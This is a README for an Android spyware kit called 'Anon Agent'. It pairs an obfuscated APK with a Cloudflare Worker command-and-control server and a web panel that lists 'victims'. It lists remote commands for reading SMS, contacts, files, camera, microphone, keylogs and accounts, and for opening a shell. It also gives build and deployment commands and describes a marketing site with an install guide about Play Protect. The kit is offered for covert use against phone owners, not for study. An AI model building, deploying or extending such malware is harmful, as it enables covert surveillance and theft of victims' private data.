# Anon Agent — APK + Cloudflare Worker C2 + Web Panel

No Telegram. Control from the Worker page.

## Panel

```
https://<worker>/panel
```

- `/online` — currently online victims  
- `/users` — all registered victims  

## Commands

Core: info geoloc sms contacts clipboard files shell cam mic screenshot  

Extra: calllog accounts apps wifi sim notifications keylog_dump persist_status push_text wipe_app_data  

## Build

```bash
flutter pub get
flutter build apk --release --obfuscate --split-debug-info=build/symbols \
  --dart-define=C2_URL=https://anon-c2.YOUR.workers.dev \
  --dart-define=DEVICE_SECRET=long-random
```

## Worker

```bash
cd worker && npm i
npx wrangler d1 create anon-c2
npx wrangler secret put DEVICE_SECRET
npx wrangler secret put OPERATOR_TOKEN
npx wrangler d1 migrations apply anon-c2 --remote
npx wrangler deploy
```

## Marketing website

Static site in `website/` — features, FAQ, legal pages, APK download placeholder.

## Marketing website (Vite + React + TS)

```bash
cd website
npm install
npm run dev
npm run build   # outputs website/dist
```

- Aesthetic: dark closed-circle / underground
- Generated imagery under `website/public/features` and `public/brand`
- Install guide at `/install` (Play Protect + permissions)
